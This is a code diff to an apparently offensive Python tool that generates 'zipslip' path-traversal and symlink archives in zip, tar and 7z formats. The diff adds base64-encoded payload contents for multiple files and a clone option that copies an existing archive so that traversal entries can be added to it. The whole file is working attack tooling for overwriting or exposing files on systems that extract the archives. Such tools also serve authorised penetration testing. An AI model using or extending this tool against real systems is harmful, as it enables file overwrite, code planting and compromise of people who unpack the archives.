@@ -1,3 +1,4 @@
+import zipfile, tarfile, py7zr
 from zipfile import ZipFile, ZipInfo, ZIP_STORED, ZIP_DEFLATED, ZIP_BZIP2, ZIP_LZMA
 from tarfile import TarFile, TarInfo, SYMTYPE
 from py7zr import (SevenZipFile, 
@@ -12,7 +13,7 @@ from py7zr import (SevenZipFile,
 					PRESET_DEFAULT)
 from py7zr.helpers import ArchiveTimestamp
 
-from io import BytesIO, FileIO, SEEK_END, SEEK_SET
+from io import BufferedIOBase, BytesIO, FileIO, SEEK_END, SEEK_SET
 from datetime import datetime
 from pathlib import Path
 import stat
@@ -20,6 +21,10 @@ import warnings
 import string
 import random
 import click
+import base64
+import binascii
+import os
+import shutil
 
 
 class Util:
@@ -30,6 +35,8 @@ class Util:
 	
 	DICT_FILE = "path_traversal_dict.txt"
 	PAYLOAD_PATH_PLACEHOLDER = "{FILE}"
+
+	MULTIPLE_FILE_CONTENTS_SPLIT = "&&&&&&"
 	
 	extensions = { 
 			("tar","none"): ".tar",
@@ -138,6 +145,9 @@ class Util:
 	
 	def parse_input_list(paths):
 		return [p.lstrip(" ") for p in paths.split(",")]
+	
+	def parse_input_list_multiple_file_contents(multiple_file_contents):
+		return [p.lstrip(" ") for p in str(multiple_file_contents).split(Util.MULTIPLE_FILE_CONTENTS_SPLIT)]
 		
 	def process_symlink_name(symlink, random_add=5, limitlen=10, extension=".symlink"):
 		# only keeps alphanumeric characters from the original file name
@@ -163,7 +173,62 @@ class Util:
 		
 		print(Util.GREEN+f"[+] Success! {archive.filename} created"+Util.END)
 
+class Cloner:
+    @staticmethod
+    def get_archive_type(filename):
+        lookup = {
+            "zip": zipfile.is_zipfile(filename),
+            "tar": tarfile.is_tarfile(filename),
+            "7z": py7zr.is_7zfile(filename)
+        }
 
+        for key in lookup:
+            if lookup[key]:
+                return key
+        return None
+    
+    @staticmethod
+    def clone_archive(source, archive_name):
+        """Efficiently clone an archive by copying and returning a writable handle"""
+        try:
+            archive_type = Cloner.get_archive_type(source)
+            if not archive_type:
+                raise ValueError("Unsupported or invalid archive format")
+
+            # Make direct copy of the source file
+            shutil.copy2(source, archive_name)
+            
+            # Handle each archive type differently
+            if archive_type == "zip":
+                # Determine compression from source
+                compression = "deflate"  # default
+                with ZipFile(source, 'r') as zf:
+                    if zf.infolist():
+                        comp_type = zf.infolist()[0].compress_type
+                        compression = {
+                            ZIP_STORED: "none",
+                            ZIP_DEFLATED: "deflate",
+                            ZIP_BZIP2: "bzip2",
+                            ZIP_LZMA: "lzma"
+                        }.get(comp_type, "deflate")
+                return Zipper(archive_name, compression, mode="a")
+            
+            elif archive_type == "tar":
+                # Tar files don't need compression info for cloning
+                return Tarrer(archive_name, "none", mode="a")
+            
+            elif archive_type == "7z":
+                # For 7z archives, we'll use a default compression since 
+                # current py7zr versions don't reliably expose the original method
+                # This is the most reliable approach that works across versions
+                return SevenZipper(archive_name, "lzma2", mode="a")
+            
+        except Exception as e:
+            if os.path.exists(archive_name):
+                os.remove(archive_name)
+            raise RuntimeError(f"Failed to clone archive: {str(e)}")
+
+		
 class Searcher:
 	def gen_search_paths(filename, depth, payload):
 		ret_list = []
@@ -200,10 +265,10 @@ class SevenZipper:
 					"copy": [{'id': FILTER_COPY}]
 				}
 	
-	def __init__(self, filename, compression_method):
+	def __init__(self, filename, compression_method, mode="w"):
 		self.filename = filename
 		self.compression_method = SevenZipper.compression_methods_lookup[compression_method]
-		self.archive = SevenZipFile(filename, mode='w', filters=self.compression_method)
+		self.archive = SevenZipFile(filename, mode=mode, filters=self.compression_method)
 	
 	def create_fileinfo(self, filename, date_time=None):
 		
@@ -213,7 +278,7 @@ class SevenZipper:
 		return filename
 	
 	def add_file(self, file_info, content, symlink=False):
-		'''Adds file to archive given zipinfo and file content'''
+		'''Adds file to archive given fileinfo and file content'''
 		
 		self.archive.writestr(content, file_info) 
 		
@@ -232,23 +297,20 @@ class SevenZipper:
 			f["attributes"] |= FILE_ATTRIBUTE_UNIX_EXTENSION | (stat.S_IFLNK << 16)
 			f["attributes"] |= stat.S_IMODE(fstat.st_mode) << 16
 			'''
-			
-		if self.date_time:
-			# Last element of files_list is the newly added file
-			f = self.archive.files.files_list[-1:][0]
-			# Make sure it's true ;)
-			assert f["filename"] == file_info
-			
-			f['lastwritetime'] = ArchiveTimestamp.from_datetime(self.date_time)
+		
+		# Last element of files_list is the newly added file
+		f = self.archive.files.files_list[-1:][0]
+		f['lastwritetime'] = ArchiveTimestamp.from_datetime(Util.check_datetime(self.date_time).timestamp())
+	
 
 class Tarrer:
 	compression_methods = ("", "gz", "bz2", "xz")
 	compression_methods_lookup = {"none": "", "deflate": "gz", "bzip2": "bz2", "lzma": "xz"}
 	
-	def __init__(self, filename, compression_method):
+	def __init__(self, filename, compression_method, mode="w"):
 		self.filename = filename
 		self.compression_method = Tarrer.compression_methods_lookup[compression_method]
-		self.archive = TarFile.open(self.filename, mode="w")
+		self.archive = TarFile.open(self.filename, mode=mode)
 
 	def create_fileinfo(self, filename, date_time=None):
 		dt = Util.check_datetime(date_time)
@@ -270,7 +332,12 @@ class Tarrer:
 			# If you write something in the symlink file, it breaks the archive
 			self.archive.addfile(file_info, None)
 		else:
-			with BytesIO(content.encode("utf-8")) as mem_file:
+			if not isinstance(content, str):
+				tmp_content = BytesIO(content)
+			else:
+				tmp_content = BytesIO(content.encode("utf-8"))
+
+			with tmp_content as mem_file:
 				mem_file.seek(0, SEEK_END)
 				file_info.size = mem_file.tell()
 				mem_file.seek(0, SEEK_SET)
@@ -281,10 +348,10 @@ class Zipper:
 	compression_methods = (ZIP_STORED, ZIP_DEFLATED, ZIP_BZIP2, ZIP_LZMA)
 	compression_methods_lookup = {"none": ZIP_STORED, "deflate": ZIP_DEFLATED, "bzip2": ZIP_BZIP2, "lzma": ZIP_LZMA}
 	
-	def __init__(self, filename, compression_method):
+	def __init__(self, filename, compression_method, mode="w"):
 		self.filename = filename
 		self.compression_method = Zipper.compression_methods_lookup[compression_method]
-		self.archive = ZipFile(self.filename, mode="w", compression=self.compression_method)
+		self.archive = ZipFile(self.filename, mode=mode, compression=self.compression_method)
 	
 	def create_fileinfo(self, filename, date_time=None):
 		'''Creates a file zipinfo object containing filename and date data'''
@@ -307,7 +374,7 @@ class Zipper:
 	def add_file(self, file_info, content, symlink=False):
 		'''Adds file to archive given zipinfo and file content'''
 		if symlink:
-			 file_info.external_attr |= stat.S_IFLNK << 16 # symlink file type
+			file_info.external_attr |= stat.S_IFLNK << 16 # symlink file type
 		self.archive.writestr(file_info, content) 
 
 	
@@ -329,14 +396,13 @@ class Zipper:
 		help="Comma separated paths to include in the archive.")
 		
 @click.option("-s", "--symlinks", 
-		help="Comma separated symlinks to include in the archive. To name a symlink use the syntax: path;name")
+		help="Comma separated symlinks to include in the archive. To name a symlink use the syntax: path:name")
 		
 @click.option("--file-content", 
-		help="Content of the files in the archive, mandatory if paths are used.")
-		
-@click.option("--force-name", 
-		is_flag=True, 
-		help="If set, the filename will be forced exactly as provided.")
+		help="Content of the files in the archive, file-content or multi-file-contents must be specified if paths are used.")
+
+@click.option("--multiple-file-contents", 
+		help="Base64 encoded contents of the files in the archive separated by commas, the number of elements in multiple-file-contents must be equal to the number of paths. The options multi-file-contents or file-content must be specified if paths are used. This options overrides file-content option if both are specified.")
 		
 @click.option("--search", 
 		type=int,
@@ -372,14 +438,17 @@ class Zipper:
 		show_default=True, 
 		help="Mass-find placeholder for filename in dictionary")
 		
+@click.option("--clone",
+		help="Archive to clone. It creates a copy of an existing archive and opens it in memory to allow adding payloads.")
+		
 @click.option("-v", "--verbose", 
 		is_flag=True, 
 		help="Verbosity trigger.")
 		
 @click.argument("archive-name")
-def main_procedure(archive_type, compression, paths, symlinks, file_content, 
-		archive_name, force_name, search, dotdotslash, mass_find, mass_find_mode, mass_find_dict,
-		mass_find_placeholder, verbose):
+def main_procedure(archive_type, compression, paths, symlinks, file_content, multiple_file_contents,
+		archive_name, search, dotdotslash, mass_find, mass_find_mode, mass_find_dict,
+		mass_find_placeholder, clone, verbose):
 	"""
 	Script to generate "zipslip" and "zip symlink" archives.
 	
@@ -393,30 +462,45 @@ def main_procedure(archive_type, compression, paths, symlinks, file_content,
 	archiver = supported_archives.get(archive_type)
 
 	# At least one of paths, symlinks or mass_find need to be specified
+	# TODO: remove test
 	if not paths and not symlinks and not mass_find:
 		print() # Adds a newline
 		raise click.ClickException("At least one of paths, symlinks or mass-find needs to be specified.")
 		exit(1)
 	
-	if not force_name:
-	
-		if not compression in Util.compression_lookup[archive_type]:
-			n_compression = Util.default_compression_lookup[archive_type]
-			print(Util.YELLOW+f"[*] Compression {compression} not supported by {archive_type} archives, defaulting to {n_compression}"+Util.END)
-			compression = n_compression
-			
-		# Infer extension from file type and compression method
-		ext = Util.extensions[(archive_type, compression)]
-		archive_name = archive_name + ext
+	if not compression in Util.compression_lookup[archive_type]:
+		n_compression = Util.default_compression_lookup[archive_type]
+		print(Util.YELLOW+f"[*] Compression {compression} not supported by {archive_type} archives, defaulting to {n_compression}"+Util.END)
+		compression = n_compression
 
-	
 	if paths:
-		if not file_content:
+		if not file_content and not multiple_file_contents:
 			print() # Adds a newline
-			raise click.ClickException("file-content is required when using paths")
+			raise click.ClickException("file-content or multiple-file-contents are required when using paths")
 			exit(1)
 		
+		# File contents operations
+		if multiple_file_contents:
+			multiple_file_contents = Util.parse_input_list(multiple_file_contents)
+			tmp = []
+
+			#base64 decode
+			for mfc in multiple_file_contents:
+				try:
+					tmp.append(base64.b64decode(mfc))
+				#TODO: add specific exception here
+				except (binascii.Error, ValueError):
+					raise click.ClickException("invalid base64 string in multiple-file-contents.")
+					exit(1)
+
+			multiple_file_contents = tmp
+
 		paths = Util.parse_input_list(paths)
+		
+		if multiple_file_contents:
+			if not len(paths) == len(multiple_file_contents):
+				raise click.ClickException(f"the number of paths must match the number of file contents specified in multiple-file-contents. Length found {len(paths)=} {len(multiple_file_contents)=}")
+				exit(1)
 	else:
 		# Default value (not supported by click)
 		paths = []
@@ -439,17 +523,25 @@ def main_procedure(archive_type, compression, paths, symlinks, file_content,
 				break
 
 			if mass_find_mode == "paths":
-				path = line.replace(Util.PAYLOAD_PATH_PLACEHOLDER, mass_find)
-				paths.append(path)
+				if not file_content and not multiple_file_contents:
+					print() # Adds a newline
+					raise click.ClickException("file-content or multiple-file-contents are required when using paths")
+					exit(1)
+				else:
+					path = line.replace(mass_find_placeholder, mass_find)
+					paths.append(path)
 				
 			elif mass_find_mode == "symlinks":
-				symlink = line.replace(Util.PAYLOAD_PATH_PLACEHOLDER, mass_find)
+				symlink = line.replace(mass_find_placeholder, mass_find)
 				symlinks.append(symlink)
 	  
 		mass_find_dict.close()
 	
-	# Create archive after every required option is already checked
-	a = archiver(archive_name, compression)
+	# Creates archive after every required option is already checked
+	if clone:
+		a = Cloner.clone_archive(clone, archive_name)
+	else:
+		a = archiver(archive_name, compression)
 	
 	if symlinks:
 		for s in symlinks:
@@ -469,9 +561,9 @@ def main_procedure(archive_type, compression, paths, symlinks, file_content,
 					a.add_file(fi, s, symlink=True)
 			else:
 				if dotdotslash:
-					sp = Searcher.gen_search_paths(s, searchdepth, payload=dotdotslash)
+					sp = Searcher.gen_search_paths(s, search, payload=dotdotslash)
 				else:
-					sp = Searcher.gen_search_paths(s, searchdepth)
+					sp = Searcher.gen_search_paths(s, search)
 					
 				for ssp in sp:
 					symlink_name = Util.process_symlink_name(s)
@@ -479,24 +571,43 @@ def main_procedure(archive_type, compression, paths, symlinks, file_content,
 					a.add_file(fi, ssp, symlink=True)
 							
 	if paths:
-		for f in paths:
-			if not search:
-				fi = a.create_fileinfo(f)
-				a.add_file(fi, file_content)
-			else:
-				if dotdotslash:
-					fp = Searcher.gen_search_paths(f, search, payload=dotdotslash)
+		if multiple_file_contents or file_content:
+
+			# if multiple file contents are specified			
+			if multiple_file_contents:
+				iterator = tuple()	#the iterator is a tuple that will contain (path, file_content)
+				content_iter = zip(paths, multiple_file_contents)
+			elif file_content:
+				iterator = ""
+				content_iter = paths
+				fc = file_content
+
+			for iterator in content_iter:
+				if isinstance(iterator, tuple):
+					fc = iterator[1]
+					f = iterator[0]
 				else:
-					fp = Searcher.gen_search_paths(f, search)
-					
-				for ffp in fp:
-					fi = a.create_fileinfo(ffp)
-					a.add_file(fi, file_content)
+					f = iterator
+
+				if not search:
+					fi = a.create_fileinfo(f)
+					a.add_file(fi, fc)
+				else:
+					if dotdotslash:
+						fp = Searcher.gen_search_paths(f, search, payload=dotdotslash)
+					else:
+						fp = Searcher.gen_search_paths(f, search)
+						
+					for ffp in fp:
+						fi = a.create_fileinfo(ffp)
+						a.add_file(fi, fc)
 				
 	if verbose:
 		Util.archive_info(a, archive_type, compression)
 		
 	a.archive.close()
 	exit(0)
+
+
 
 main_procedure()
